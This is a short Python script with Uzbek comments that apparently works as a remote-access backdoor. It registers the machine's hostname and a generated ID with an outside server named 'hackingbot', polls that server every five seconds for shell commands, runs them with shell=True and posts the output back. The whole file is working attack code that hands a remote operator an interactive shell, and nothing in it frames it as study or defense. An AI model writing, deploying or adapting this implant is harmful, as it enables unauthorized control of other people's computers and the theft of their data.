import requests
import time
import socket
import subprocess
import uuid

# 🔧 Sozlamalar
SERVER_URL = "https://hackingbot.alwaysdata.net"
DEVICE_ID = str(uuid.uuid4())  # har bir qurilma uchun noyob ID
HOSTNAME = socket.gethostname()

def register():
    """Serverga qurilmani ro‘yxatdan o‘tkazish"""
    try:
        res = requests.post(
            f"{SERVER_URL}/register",
            json={"deviceId": DEVICE_ID, "hostname": HOSTNAME},
            timeout=10
        )
        if res.status_code == 200:
            print("[+] Device ro‘yxatdan o‘tdi.")
        else:
            print("[-] Ro‘yxatdan o‘tkazishda xato:", res.text)
    except Exception as e:
        print("[-] Serverga ulanishda xato:", e)

def get_commands():
    """Serverdan bajariladigan komandalarni olish"""
    try:
        res = requests.get(f"{SERVER_URL}/get-command/{DEVICE_ID}", timeout=10)
        if res.status_code == 200:
            return res.json().get("commands", [])
    except Exception as e:
        print("[-] Buyruq olishda xato:", e)
    return []

def send_result(cmd, result):
    """Buyruq natijasini serverga qaytarish"""
    try:
        requests.post(
            f"{SERVER_URL}/send-result",
            json={"deviceId": DEVICE_ID, "cmd": cmd, "result": result},
            timeout=10
        )
    except Exception as e:
        print("[-] Natija yuborishda xato:", e)

def run_command(cmd):
    """Komandani bajarish"""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return output.strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()
    except Exception as e:
        return str(e)

def main():
    register()
    while True:
        commands = get_commands()
        if commands:
            for cmd in commands:
                print(f"[>] Bajaryapman: {cmd}")
                result = run_command(cmd)
                send_result(cmd, result)
        time.sleep(5)  # 5 soniyada bir marta tekshiradi

if __name__ == "__main__":
    main()
